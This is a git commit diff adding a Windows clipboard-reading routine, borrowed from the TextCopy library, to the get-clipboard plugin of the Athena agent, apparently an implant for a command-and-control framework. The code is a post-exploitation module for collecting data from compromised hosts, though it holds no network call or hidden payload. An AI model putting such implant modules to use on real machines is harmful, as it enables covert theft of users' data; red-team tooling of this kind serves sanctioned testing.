a25c8ebbb1ef3d169dcfd43a294ab6bc0389ba9e
checkymander <checkymander@protonmail.com>
2021-08-26 23:30:24 -0400

    added get-clipboard command dll's

--- Payload_Type/Athena/agent_code/AthenaPlugins/get-clipboard/get-clipboard.cs
+++ Payload_Type/Athena/agent_code/AthenaPlugins/get-clipboard/get-clipboard.cs
@@ -1,7 +1,9 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.ComponentModel;
 using System.Net;
 using System.Runtime.InteropServices;
+using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 
@@ -11,25 +13,132 @@ namespace Athena
     {
         public static string Execute(Dictionary<string, object> args)
         {
-
-
+            //I can either include this all in one (easier but larger plugin size)
+            //Or I can split them into 3 separate DLL's and handle which one to load on the "load" side
             if(OperatingSystem.IsMacOS())
             {
                 return OsxClipboard.GetText();
             }
             else if (OperatingSystem.IsWindows())
             {
-                return "Not implemented yet.";
+                return WindowsClipboard.GetText();
             }
             else if (OperatingSystem.IsLinux())
             {
                 return "Not implemented yet.";
             }
-
-            return Dns.GetHostName();
+            else
+            {
+                return "Not implemented yet.";
+            }
         }
 
-        //Clipboard code from: https://github.com/CopyText/TextCopy
+        //Clipboard code from TextCopy: https://github.com/CopyText/TextCopy
+        //https://github.com/CopyText/TextCopy/blob/master/src/TextCopy/WindowsClipboard.cs
+        static class WindowsClipboard
+        {
+            static void TryOpenClipboard()
+            {
+                var num = 10;
+                while (true)
+                {
+                    if (OpenClipboard(default))
+                    {
+                        break;
+                    }
+
+                    if (--num == 0)
+                    {
+                        ThrowWin32();
+                    }
+
+                    Thread.Sleep(100);
+                }
+            }
+
+            public static string? GetText()
+            {
+                if (!IsClipboardFormatAvailable(cfUnicodeText))
+                {
+                    return null;
+                }
+                TryOpenClipboard();
+
+                return InnerGet();
+            }
+
+            static string? InnerGet()
+            {
+                IntPtr handle = default;
+
+                IntPtr pointer = default;
+                try
+                {
+                    handle = GetClipboardData(cfUnicodeText);
+                    if (handle == default)
+                    {
+                        return null;
+                    }
+
+                    pointer = GlobalLock(handle);
+                    if (pointer == default)
+                    {
+                        return null;
+                    }
+
+                    var size = GlobalSize(handle);
+                    var buff = new byte[size];
+
+                    Marshal.Copy(pointer, buff, 0, size);
+
+                    return Encoding.Unicode.GetString(buff).TrimEnd('\0');
+                }
+                finally
+                {
+                    if (pointer != default)
+                    {
+                        GlobalUnlock(handle);
+                    }
+
+                    CloseClipboard();
+                }
+            }
+
+            const uint cfUnicodeText = 13;
+
+            static void ThrowWin32()
+            {
+                throw new Win32Exception(Marshal.GetLastWin32Error());
+            }
+
+            [DllImport("User32.dll", SetLastError = true)]
+            [return: MarshalAs(UnmanagedType.Bool)]
+            static extern bool IsClipboardFormatAvailable(uint format);
+
+            [DllImport("User32.dll", SetLastError = true)]
+            static extern IntPtr GetClipboardData(uint uFormat);
+
+            [DllImport("kernel32.dll", SetLastError = true)]
+            static extern IntPtr GlobalLock(IntPtr hMem);
+
+            [DllImport("kernel32.dll", SetLastError = true)]
+            [return: MarshalAs(UnmanagedType.Bool)]
+            static extern bool GlobalUnlock(IntPtr hMem);
+
+            [DllImport("user32.dll", SetLastError = true)]
+            [return: MarshalAs(UnmanagedType.Bool)]
+            static extern bool OpenClipboard(IntPtr hWndNewOwner);
+
+            [DllImport("user32.dll", SetLastError = true)]
+            [return: MarshalAs(UnmanagedType.Bool)]
+            static extern bool CloseClipboard();
+
+            [DllImport("Kernel32.dll", SetLastError = true)]
+            static extern int GlobalSize(IntPtr hMem);
+        }
+
+        //Clipboard code from TextCopy: https://github.com/CopyText/TextCopy
+        //https://github.com/CopyText/TextCopy/blob/master/src/TextCopy/OsxClipboard.cs
         static class OsxClipboard
         {
             static IntPtr nsString = objc_getClass("NSString");
